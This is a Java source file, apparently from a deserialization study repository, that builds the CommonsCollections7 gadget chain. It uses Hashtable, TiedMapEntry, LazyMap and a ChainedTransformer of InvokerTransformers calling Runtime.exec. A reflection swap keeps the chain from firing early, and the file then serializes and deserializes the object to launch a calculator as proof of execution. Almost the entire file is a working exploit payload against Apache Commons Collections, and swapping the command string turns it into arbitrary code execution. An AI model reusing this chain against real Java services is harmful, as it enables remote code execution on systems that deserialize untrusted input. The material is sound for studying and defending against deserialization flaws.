package org.su18.serialize.ysoserial.CommonCollections.CommonCollections7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.su18.serialize.utils.SerializeUtil;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * @author su18
 */
public class CC7 {

	public static void main(String[] args) throws Exception {
		// 初始化 HashMap
		Hashtable<Object, Object> hashtable = new Hashtable<>();

		// 创建 ChainedTransformer
		Transformer[] transformers = new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
				new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"})
		};

		// 创建一个空的 ChainedTransformer
		ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{});

		// 创建 LazyMap 并引入 TiedMapEntry
		Map          lazyMap = LazyMap.decorate(new HashMap(), fakeChain);
		TiedMapEntry entry   = new TiedMapEntry(lazyMap, "su18");

		hashtable.put(entry, "su18");

		//用反射再改回真的chain
		Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
		f.setAccessible(true);
		f.set(fakeChain, transformers);
		//清空由于 hashtable.put 对 LazyMap 造成的影响
		lazyMap.clear();

		SerializeUtil.writeObjectToFile(hashtable);
		SerializeUtil.readFileObject();
	}
}
